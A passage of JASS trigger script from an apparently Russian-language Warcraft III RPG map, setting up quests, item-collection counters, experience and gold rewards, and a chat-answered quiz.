endif
endfunction
function BJX takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=25) then
return false
endif
return true
endfunction
function BJY takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[16])
call QuestSetCompletedBJ(YX[16],true)
call DestroyQuest(YX[16])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FFFF00Мясник кое-что украл. Надеюсь, Вы это нашли|r")
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BJU))
call ForGroupBJ(Th,function BJW)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF2800 опыта|r, |c00ffff00400 золота|r, |c00ff969610 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BJX() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+30
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BJZ takes nothing returns nothing
set Zn=CreateTrigger()
call DisableTrigger(Zn)
call TriggerRegisterAnyUnitEventBJ(Zn,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Zn,Condition(function BJP))
call TriggerAddAction(Zn,function BJY)
endfunction
function BJa takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E726F67) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BJb takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=28) then
return false
endif
return true
endfunction
function BJc takes nothing returns nothing
if BJb() then
call EnableTrigger(Zg)
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[6])
call AddSpecialEffectTargetUnitBJ("overhead",KV,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[6]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Узуран \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 28-33|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Узуран","|c00FFFF00Разбойник:|r Я разрешаю Вам убить Узурана! Вперед, Герои!
|c006969FFУровень задания: 28-33|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[6]=GetLastCreatedQuestBJ()
else
call ne(GetTriggerUnit(),"Задание с |c00ff000028|r уровня",.027,255,255,255)
endif
endfunction
function BJd takes nothing returns nothing
set Zo=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Zo,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Zo,Condition(function BJa))
call TriggerAddAction(Zo,function BJc)
endfunction
function BJe takes nothing returns nothing
call DestroyEffectBJ(Us[6])
call DisableTrigger(Zq)
call DisableTrigger(Zr)
call EnableTrigger(Zs)
call AddSpecialEffectTargetUnitBJ("overhead",KV,"war3mapImported\\QuestYellow1.mdx")
set Us[6]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_UPDATED,"|cffffcc00Узуран погиб. Возвращайтесь к Разбойнику на наградой|r")
call DisableTrigger(GetTriggeringTrigger())
endfunction
function BJf takes nothing returns nothing
set Zp=CreateTrigger()
call TriggerRegisterUnitEvent(Zp,K9,EVENT_UNIT_DEATH)
call TriggerAddAction(Zp,function BJe)
endfunction
function BJg takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E726F67) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BJh takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BJi takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BJj takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BJk takes nothing returns boolean
return GetBooleanAnd(BJi(),BJj())
endfunction
function BJl takes nothing returns boolean
return GetBooleanAnd(BJh(),BJk())
endfunction
function BJm takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=28) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=33) then
return false
endif
return true
endfunction
function BJn takes nothing returns nothing
if BJm() then
call AddHeroXP(GetEnumUnit(),3500,false)
set TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]=TI[GetConvertedPlayerId(GetOwningPlayer(GetEnumUnit()))]+3500
else
endif
endfunction
function BJo takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=28) then
return false
endif
return true
endfunction
function BJp takes nothing returns boolean
if not (GetUnitLevel(GetTriggerUnit())>=28) then
return false
endif
return true
endfunction
function BJq takes nothing returns nothing
if BJp() then
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($49305732,GetUnitLoc(GetTriggerUnit()))
call UnitAddAbilityBJ($416E6532,GetOrderTargetUnit())
call UnitAddAbilityBJ($41706974,GetOrderTargetUnit())
call DestroyEffectBJ(Us[6])
call QuestSetCompletedBJ(YX[6],true)
call DestroyQuest(YX[6])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BJl))
call ForGroupBJ(Th,function BJn)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3500 опыта|r, |c00ffff00400 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BJo() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+1200
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
else
call ne(GetTriggerUnit(),"Задание с |c00ff000028|r уровня",.027,255,255,255)
endif
endfunction
function BJr takes nothing returns nothing
set Zs=CreateTrigger()
call DisableTrigger(Zs)
call TriggerRegisterAnyUnitEventBJ(Zs,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Zs,Condition(function BJg))
call TriggerAddAction(Zs,function BJq)
endfunction
function BJs takes nothing returns boolean
if not (UnitHasItem(GetEnteringUnit(),GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303930))==true) then
return false
endif
return true
endfunction
function BJt takes nothing returns nothing
set YV[35]=GetRectCenter(G0)
call CreateItemLoc($49303933,YV[35])
call RemoveItem(GetItemOfTypeFromUnitBJ(GetEnteringUnit(),$49303930))
call RemoveLocation(YV[35])
endfunction
function BJu takes nothing returns nothing
set Zt=CreateTrigger()
call TriggerRegisterEnterRectSimple(Zt,G0)
call TriggerAddCondition(Zt,Condition(function BJs))
call TriggerAddAction(Zt,function BJt)
endfunction
function BJv takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E73676E) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BJw takes nothing returns boolean
if not (RZ[0]==4) then
return false
endif
return true
endfunction
function BJx takes nothing returns boolean
if not (RZ[0]==3) then
return false
endif
return true
endfunction
function BJy takes nothing returns boolean
if not (RZ[0]==2) then
return false
endif
return true
endfunction
function BJz takes nothing returns boolean
if not (RZ[0]==1) then
return false
endif
return true
endfunction
function BJ0 takes nothing returns boolean
if not (RZ[1]==4) then
return false
endif
return true
endfunction
function BJ1 takes nothing returns boolean
if not (RZ[1]==3) then
return false
endif
return true
endfunction
function BJ2 takes nothing returns boolean
if not (RZ[1]==2) then
return false
endif
return true
endfunction
function BJ3 takes nothing returns boolean
if not (RZ[1]==1) then
return false
endif
return true
endfunction
function BJ4 takes nothing returns boolean
if not (RZ[2]==4) then
return false
endif
return true
endfunction
function BJ5 takes nothing returns boolean
if not (RZ[2]==3) then
return false
endif
return true
endfunction
function BJ6 takes nothing returns boolean
if not (RZ[2]==2) then
return false
endif
return true
endfunction
function BJ7 takes nothing returns boolean
if not (RZ[2]==1) then
return false
endif
return true
endfunction
function BJ8 takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Zv)
call DestroyEffectBJ(Us[17])
call AddSpecialEffectTargetUnitBJ("overhead",Kg,"war3mapImported\\QuestYellow1_Portrait.mdx")
set Us[17]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Впервые в воду \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 29-35|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Впервые в воду","Архипелаг - опасное и в то же время удивительное место. Недавно там гулял и розтерял свои вещи. Принесете, а? Не обижу наградой! Мне нужно: красная звезда, синяя звезда, черная звезда и ракушка.
|c006969FFУровень задания: 29-35|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[17]=GetLastCreatedQuestBJ()
set RZ[0]=GetRandomInt(1,4)
if BJw() then
set YV[36]=GetRectCenter(Bb)
call CreateItemLoc($4930344A,YV[36])
call RemoveLocation(YV[36])
else
endif
if BJx() then
set YV[36]=GetRectCenter(BX)
call CreateItemLoc($4930344A,YV[36])
call RemoveLocation(YV[36])
else
endif
if BJy() then
set YV[36]=GetRectCenter(BV)
call CreateItemLoc($4930344A,YV[36])
call RemoveLocation(YV[36])
else
endif
if BJz() then
set YV[36]=GetRectCenter(Bh)
call CreateItemLoc($4930344A,YV[36])
call RemoveLocation(YV[36])
else
endif
set RZ[1]=GetRandomInt(1,4)
if BJ0() then
set YV[37]=GetRectCenter(Bg)
call CreateItemLoc($4930344B,YV[37])
call RemoveLocation(YV[37])
else
endif
if BJ1() then
set YV[37]=GetRectCenter(Bf)
call CreateItemLoc($4930344B,YV[37])
call RemoveLocation(YV[37])
else
endif
if BJ2() then
set YV[37]=GetRectCenter(Bc)
call CreateItemLoc($4930344B,YV[37])
call RemoveLocation(YV[37])
else
endif
if BJ3() then
set YV[37]=GetRectCenter(Ba)
call CreateItemLoc($4930344B,YV[37])
call RemoveLocation(YV[37])
else
endif
set RZ[2]=GetRandomInt(1,4)
if BJ4() then
set YV[38]=GetRectCenter(BU)
call CreateItemLoc($4930344C,YV[38])
call RemoveLocation(YV[38])
else
endif
if BJ5() then
set YV[38]=GetRectCenter(Bd)
call CreateItemLoc($4930344C,YV[38])
call RemoveLocation(YV[38])
else
endif
if BJ6() then
set YV[38]=GetRectCenter(BY)
call CreateItemLoc($4930344C,YV[38])
call RemoveLocation(YV[38])
else
endif
if BJ7() then
set YV[38]=GetRectCenter(BU)
call CreateItemLoc($4930344C,GetRectCenter(BU))
call RemoveLocation(YV[38])
else
endif
endfunction
function BJ9 takes nothing returns nothing
set Zu=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Zu,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Zu,Condition(function BJv))
call TriggerAddAction(Zu,function BJ8)
endfunction
function BKB takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$4930344A then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344B then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344C then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344D then
return true
endif
return false
endfunction
function BKC takes nothing returns boolean
if not BKB() then
return false
endif
return true
endfunction
function BKD takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING," |c0000FF00Вещи:|r 1/4")
call TriggerSleepAction(.5)
call EnableTrigger(Zw)
endfunction
function BKE takes nothing returns nothing
set Zv=CreateTrigger()
call DisableTrigger(Zv)
call TriggerRegisterAnyUnitEventBJ(Zv,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Zv,Condition(function BKC))
call TriggerAddAction(Zv,function BKD)
endfunction
function BKF takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$4930344A then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344B then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344C then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344D then
return true
endif
return false
endfunction
function BKG takes nothing returns boolean
if not BKF() then
return false
endif
return true
endfunction
function BKH takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING," |c0000FF00Вещи:|r 2/4")
call TriggerSleepAction(.5)
call EnableTrigger(Zx)
endfunction
function BKI takes nothing returns nothing
set Zw=CreateTrigger()
call DisableTrigger(Zw)
call TriggerRegisterAnyUnitEventBJ(Zw,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Zw,Condition(function BKG))
call TriggerAddAction(Zw,function BKH)
endfunction
function BKJ takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$4930344A then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344B then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344C then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344D then
return true
endif
return false
endfunction
function BKK takes nothing returns boolean
if not BKJ() then
return false
endif
return true
endfunction
function BKL takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING," |c0000FF00Вещи:|r 3/4")
call TriggerSleepAction(.5)
call EnableTrigger(Zy)
endfunction
function BKM takes nothing returns nothing
set Zx=CreateTrigger()
call DisableTrigger(Zx)
call TriggerRegisterAnyUnitEventBJ(Zx,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Zx,Condition(function BKK))
call TriggerAddAction(Zx,function BKL)
endfunction
function BKN takes nothing returns boolean
if GetItemTypeId(GetManipulatedItem())==$4930344A then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344B then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344C then
return true
endif
if GetItemTypeId(GetManipulatedItem())==$4930344D then
return true
endif
return false
endfunction
function BKO takes nothing returns boolean
if not BKN() then
return false
endif
return true
endfunction
function BKP takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DestroyEffectBJ(Us[17])
call AddSpecialEffectTargetUnitBJ("overhead",Kg,"war3mapImported\\QuestYellow1.mdx")
set Us[17]=GetLastCreatedEffectBJ()
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING," |c0000FF00Вещи:|r 4/4")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"Вернитесь к Левитану. Вещи собраны!")
call EnableTrigger(Zz)
endfunction
function BKQ takes nothing returns nothing
set Zy=CreateTrigger()
call DisableTrigger(Zy)
call TriggerRegisterAnyUnitEventBJ(Zy,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddCondition(Zy,Condition(function BKO))
call TriggerAddAction(Zy,function BKP)
endfunction
function BKR takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6E73676E) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BKS takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BKT takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BKU takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BKV takes nothing returns boolean
return GetBooleanAnd(BKT(),BKU())
endfunction
function BKW takes nothing returns boolean
return GetBooleanAnd(BKS(),BKV())
endfunction
function BKX takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=29) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=35) then
return false
endif
return true
endfunction
function BKY takes nothing returns nothing
if BKX() then
call AddHeroXP(GetEnumUnit(),3500,false)
else
endif
endfunction
function BKZ takes nothing returns boolean
if not (GetUnitLevel(MT[GetForLoopIndexB()-1])>=29) then
return false
endif
return true
endfunction
function BKa takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call CreateItemLoc($49305454,GetUnitLoc(GetTriggerUnit()))
call DestroyEffectBJ(Us[17])
call QuestSetCompletedBJ(YX[17],true)
call DestroyQuest(YX[17])
set Th=GetUnitsInRectMatching(GetPlayableMapRect(),Condition(function BKW))
call ForGroupBJ(Th,function BKY)
call DestroyGroup(Th)
set Sf=Sf+1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_COMPLETED,"|c00FF7F00Задание выполнено!|r Награда: |c00FF00FF3500 опыта|r, |c00ffff00300 золота|r, |c00ff969615 Кровавых Меток")
set bj_forLoopBIndex=1
set bj_forLoopBIndexEnd=8
loop
exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
if BKZ() then
set NJ[GetForLoopIndexB()]=NJ[GetForLoopIndexB()]+900
set NK[GetForLoopIndexB()]=NK[GetForLoopIndexB()]+45
else
endif
set bj_forLoopBIndex=bj_forLoopBIndex+1
endloop
endfunction
function BKb takes nothing returns nothing
set Zz=CreateTrigger()
call DisableTrigger(Zz)
call TriggerRegisterAnyUnitEventBJ(Zz,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Zz,Condition(function BKR))
call TriggerAddAction(Zz,function BKa)
endfunction
function BKc takes nothing returns boolean
if not (GetUnitTypeId(GetOrderTargetUnit())==$6F776172) then
return false
endif
if not (DistanceBetweenPoints(GetUnitLoc(GetTriggerUnit()),GetUnitLoc(GetOrderTargetUnit()))<=300.) then
return false
endif
return true
endfunction
function BKd takes nothing returns boolean
if not (RZ[3]==5) then
return false
endif
return true
endfunction
function BKe takes nothing returns boolean
if not (RZ[3]==4) then
return false
endif
return true
endfunction
function BKf takes nothing returns boolean
if not (RZ[3]==3) then
return false
endif
return true
endfunction
function BKg takes nothing returns boolean
if not (RZ[3]==2) then
return false
endif
return true
endfunction
function BKh takes nothing returns boolean
if not (RZ[3]==1) then
return false
endif
return true
endfunction
function BKi takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Zv)
call DestroyEffectBJ(Us[18])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_DISCOVERED,"|cffffcc00Задание получено:|r \"Три за один \".")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c006969FFУровень задания: 29-35|r
")
call CreateQuestBJ(bj_QUESTTYPE_OPT_DISCOVERED,"Три за один","Хотите получить заветный ключик? Выполните три моих задания! А вот и первое из них. |c00FF0000Ответьте на вопрос.|r
|c006969FFУровень задания: 29-35|r","ReplaceableTextures\\CommandButtons\\BTNAmbush.blp")
set YX[18]=GetLastCreatedQuestBJ()
set RZ[3]=GetRandomInt(1,5)
if BKd() then
call CreateTextTagLocBJ("|c00FF0000Вопрос:|r Как звали Босса в локации \"Старое Кладбище\"?",GetUnitLoc(GetTriggerUnit()),0,10,100,100,100,0)
set Z1[3]=GetLastCreatedTextTag()
call EnableTrigger(Z2)
else
endif
if BKe() then
call CreateTextTagLocBJ("|c00FF0000Вопрос:|r Какой ник главного создателя этой игры?",GetUnitLoc(GetTriggerUnit()),0,10,100,100,100,0)
set Z1[3]=GetLastCreatedTextTag()
call EnableTrigger(Z3)
else
endif
if BKf() then
call CreateTextTagLocBJ("|c00FF0000Вопрос:|r Сколько Властелинов правило этим миром при его создании?",GetUnitLoc(GetTriggerUnit()),0,10,100,100,100,0)
set Z1[3]=GetLastCreatedTextTag()
call EnableTrigger(Z4)
else
endif
if BKg() then
call CreateTextTagLocBJ("|c00FF0000Вопрос:|r Какое название мира, в котором Вы сейчас находитесь?",GetUnitLoc(GetTriggerUnit()),0,10,100,100,100,0)
set Z1[3]=GetLastCreatedTextTag()
call EnableTrigger(Z5)
else
endif
if BKh() then
call CreateTextTagLocBJ("|c00FF0000Вопрос:|r каков ответ примера \"(4+2х2)(40-4х8)\"?",GetUnitLoc(GetTriggerUnit()),0,10,100,100,100,0)
set Z1[3]=GetLastCreatedTextTag()
call EnableTrigger(Z6)
else
endif
endfunction
function BKj takes nothing returns nothing
set Z0=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Z0,EVENT_PLAYER_UNIT_ISSUED_TARGET_ORDER)
call TriggerAddCondition(Z0,Condition(function BKc))
call TriggerAddAction(Z0,function BKi)
endfunction
function BKk takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Z7)
call EnableTrigger(Z8)
call DestroyTextTagBJ(Z1[3])
call SetUnitInvulnerable(Iw,false)
call SetUnitOwner(Iw,GetTriggerPlayer(),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Первое задание Вы выполнили. Посмотрим, справитесь ли Вы со вторым. Доведите меня спокойно в безопасное местечко.")
call PingMinimapLocForForce(GetPlayersAll(),GetRectCenter(Bi),100.)
endfunction
function BKl takes nothing returns nothing
set Z6=CreateTrigger()
call DisableTrigger(Z6)
call TriggerRegisterPlayerChatEvent(Z6,Player(0),"64",true)
call TriggerRegisterPlayerChatEvent(Z6,Player(1),"64",true)
call TriggerRegisterPlayerChatEvent(Z6,Player(2),"64",true)
call TriggerRegisterPlayerChatEvent(Z6,Player(3),"64",true)
call TriggerRegisterPlayerChatEvent(Z6,Player(4),"64",true)
call TriggerRegisterPlayerChatEvent(Z6,Player(5),"64",true)
call TriggerRegisterPlayerChatEvent(Z6,Player(6),"64",true)
call TriggerRegisterPlayerChatEvent(Z6,Player(7),"64",true)
call TriggerAddAction(Z6,function BKk)
endfunction
function BKm takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Z7)
call EnableTrigger(Z8)
call DestroyTextTagBJ(Z1[3])
call SetUnitInvulnerable(Iw,false)
call SetUnitOwner(Iw,GetTriggerPlayer(),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Первое задание Вы выполнили. Посмотрим, справитесь ли Вы со вторым. Доведите меня спокойно в безопасное местечко.")
call PingMinimapLocForForce(GetPlayersAll(),GetRectCenter(Bi),100.)
endfunction
function BKn takes nothing returns nothing
set Z5=CreateTrigger()
call DisableTrigger(Z5)
call TriggerRegisterPlayerChatEvent(Z5,Player(0),"Мэлерот",true)
call TriggerRegisterPlayerChatEvent(Z5,Player(1),"Мэлерот",true)
call TriggerRegisterPlayerChatEvent(Z5,Player(2),"Мэлерот",true)
call TriggerRegisterPlayerChatEvent(Z5,Player(3),"Мэлерот",true)
call TriggerRegisterPlayerChatEvent(Z5,Player(4),"Мэлерот",true)
call TriggerRegisterPlayerChatEvent(Z5,Player(5),"Мэлерот",true)
call TriggerRegisterPlayerChatEvent(Z5,Player(6),"Мэлерот",true)
call TriggerRegisterPlayerChatEvent(Z5,Player(7),"Мэлерот",true)
call TriggerAddAction(Z5,function BKm)
endfunction
function BKo takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Z7)
call EnableTrigger(Z8)
call DestroyTextTagBJ(Z1[3])
call SetUnitInvulnerable(Iw,false)
call SetUnitOwner(Iw,GetTriggerPlayer(),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Первое задание Вы выполнили. Посмотрим, справитесь ли Вы со вторым. Доведите меня спокойно в безопасное местечко.")
call PingMinimapLocForForce(GetPlayersAll(),GetRectCenter(Bi),100.)
endfunction
function BKp takes nothing returns nothing
set Z4=CreateTrigger()
call DisableTrigger(Z4)
call TriggerRegisterPlayerChatEvent(Z4,Player(0),"4",true)
call TriggerRegisterPlayerChatEvent(Z4,Player(1),"4",true)
call TriggerRegisterPlayerChatEvent(Z4,Player(2),"4",true)
call TriggerRegisterPlayerChatEvent(Z4,Player(3),"4",true)
call TriggerRegisterPlayerChatEvent(Z4,Player(4),"4",true)
call TriggerRegisterPlayerChatEvent(Z4,Player(5),"4",true)
call TriggerRegisterPlayerChatEvent(Z4,Player(6),"4",true)
call TriggerRegisterPlayerChatEvent(Z4,Player(7),"4",true)
call TriggerAddAction(Z4,function BKo)
endfunction
function BKq takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Z7)
call EnableTrigger(Z8)
call DestroyTextTagBJ(Z1[3])
call SetUnitInvulnerable(Iw,false)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Первое задание Вы выполнили. Посмотрим, справитесь ли Вы со вторым. Доведите меня спокойно в безопасное местечко.")
call SetUnitOwner(Iw,GetTriggerPlayer(),true)
call PingMinimapLocForForce(GetPlayersAll(),GetRectCenter(Bi),100.)
endfunction
function BKr takes nothing returns nothing
set Z3=CreateTrigger()
call DisableTrigger(Z3)
call TriggerRegisterPlayerChatEvent(Z3,Player(0),"I-IntegraL",true)
call TriggerRegisterPlayerChatEvent(Z3,Player(1),"I-IntegraL",true)
call TriggerRegisterPlayerChatEvent(Z3,Player(2),"I-IntegraL",true)
call TriggerRegisterPlayerChatEvent(Z3,Player(3),"I-IntegraL",true)
call TriggerRegisterPlayerChatEvent(Z3,Player(4),"I-IntegraL",true)
call TriggerRegisterPlayerChatEvent(Z3,Player(5),"I-IntegraL",true)
call TriggerRegisterPlayerChatEvent(Z3,Player(6),"I-IntegraL",true)
call TriggerRegisterPlayerChatEvent(Z3,Player(7),"I-IntegraL",true)
call TriggerAddAction(Z3,function BKq)
endfunction
function BKs takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call EnableTrigger(Z7)
call EnableTrigger(Z8)
call DestroyTextTagBJ(Z1[3])
call SetUnitInvulnerable(Iw,false)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Первое задание Вы выполнили. Посмотрим, справитесь ли Вы со вторым. Доведите меня спокойно в безопасное местечко.")
call SetUnitOwner(Iw,GetTriggerPlayer(),true)
call PingMinimapLocForForce(GetPlayersAll(),GetRectCenter(Bi),100.)
endfunction
function BKt takes nothing returns nothing
set Z2=CreateTrigger()
call DisableTrigger(Z2)
call TriggerRegisterPlayerChatEvent(Z2,Player(0),"Узуран",true)
call TriggerRegisterPlayerChatEvent(Z2,Player(1),"Узуран",true)
call TriggerRegisterPlayerChatEvent(Z2,Player(2),"Узуран",true)
call TriggerRegisterPlayerChatEvent(Z2,Player(3),"Узуран",true)
call TriggerRegisterPlayerChatEvent(Z2,Player(4),"Узуран",true)
call TriggerRegisterPlayerChatEvent(Z2,Player(5),"Узуран",true)
call TriggerRegisterPlayerChatEvent(Z2,Player(6),"Узуран",true)
call TriggerRegisterPlayerChatEvent(Z2,Player(7),"Узуран",true)
call TriggerAddAction(Z2,function BKs)
endfunction
function BKu takes nothing returns boolean
if not (GetUnitTypeId(GetEnteringUnit())==GetUnitTypeId(Iw)) then
return false
endif
return true
endfunction
function BKv takes nothing returns nothing
call DisableTrigger(GetTriggeringTrigger())
call DisableTrigger(Z8)
call EnableTrigger(Z9)
set YV[39]=GetRectCenter(Bj)
call SetUnitPositionLocFacingBJ(Iw,YV[39],bj_UNIT_FACING)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"Молодцы! Ну и последнее. Сумеете победить меня - отдам награду!")
call TriggerSleepAction(5.)
call SetUnitOwner(Iw,Player(11),true)
call RemoveLocation(YV[39])
endfunction
function BKw takes nothing returns nothing
set Z7=CreateTrigger()
call DisableTrigger(Z7)
call TriggerRegisterEnterRectSimple(Z7,Bi)
call TriggerAddCondition(Z7,Condition(function BKu))
call TriggerAddAction(Z7,function BKv)
endfunction
function BKx takes nothing returns nothing
set YV[40]=GetRectCenter(F8)
call SetUnitPositionLoc(Iw,YV[40])
call SetUnitLifePercentBJ(Iw,100)
call RemoveLocation(YV[40])
endfunction
function BKy takes nothing returns nothing
set Z8=CreateTrigger()
call DisableTrigger(Z8)
call TriggerRegisterUnitEvent(Z8,Iw,EVENT_UNIT_ATTACKED)
call TriggerAddAction(Z8,function BKx)
endfunction
function BKz takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BK0 takes nothing returns boolean
return GetPlayerController(GetOwningPlayer(GetFilterUnit()))==MAP_CONTROL_USER
endfunction
function BK1 takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$48303457
endfunction
function BK2 takes nothing returns boolean
return GetBooleanAnd(BK0(),BK1())
endfunction
function BK3 takes nothing returns boolean
return GetBooleanAnd(BKz(),BK2())
endfunction
function BK4 takes nothing returns boolean
if not (GetUnitLevel(GetEnumUnit())>=29) then
return false
endif
if not (GetUnitLevel(GetEnumUnit())<=35) then
return false
endif
return true
endfunction
